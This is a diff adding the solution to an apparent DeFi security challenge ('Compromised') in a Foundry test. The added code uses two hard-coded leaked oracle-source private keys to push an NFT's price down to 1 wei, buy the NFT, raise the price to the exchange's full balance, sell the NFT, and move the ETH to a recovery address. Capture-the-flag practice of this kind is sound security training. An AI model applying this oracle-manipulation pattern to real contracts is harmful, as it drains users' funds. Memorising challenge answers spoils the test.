@@ -75,7 +75,45 @@ contract CompromisedChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_compromised() public checkSolved {
-        
+// Compromised private keys
+    uint256 sourceKey1 = 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744;
+    uint256 sourceKey2 = 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159;
+
+    vm.stopPrank(); // stop player prank to use vm.prank with source keys
+
+    // Step 1: Post price = 1 wei using both compromised sources
+    vm.prank(vm.addr(sourceKey1));
+    oracle.postPrice("DVNFT", 1);
+    vm.prank(vm.addr(sourceKey2));
+    oracle.postPrice("DVNFT", 1);
+
+    // Step 2: Buy NFT for 1 wei as player
+    vm.startPrank(player);
+    uint256 id = exchange.buyOne{value: 1}();
+
+    // Step 3: Post price = exchange balance using both compromised sources
+    vm.stopPrank();
+    uint256 exchangeBalance = address(exchange).balance;
+    vm.prank(vm.addr(sourceKey1));
+    oracle.postPrice("DVNFT", exchangeBalance);
+    vm.prank(vm.addr(sourceKey2));
+    oracle.postPrice("DVNFT", exchangeBalance);
+
+    // Step 4: Sell NFT at inflated price
+    vm.startPrank(player);
+    nft.approve(address(exchange), id);
+    exchange.sellOne(id);
+
+    // Step 5: Restore price to original
+    vm.stopPrank();
+    vm.prank(vm.addr(sourceKey1));
+    oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
+    vm.prank(vm.addr(sourceKey2));
+    oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
+
+    // Step 6: Transfer ETH to recovery
+    vm.startPrank(player);
+    payable(recovery).transfer(EXCHANGE_INITIAL_ETH_BALANCE);        
     }
 
     /**
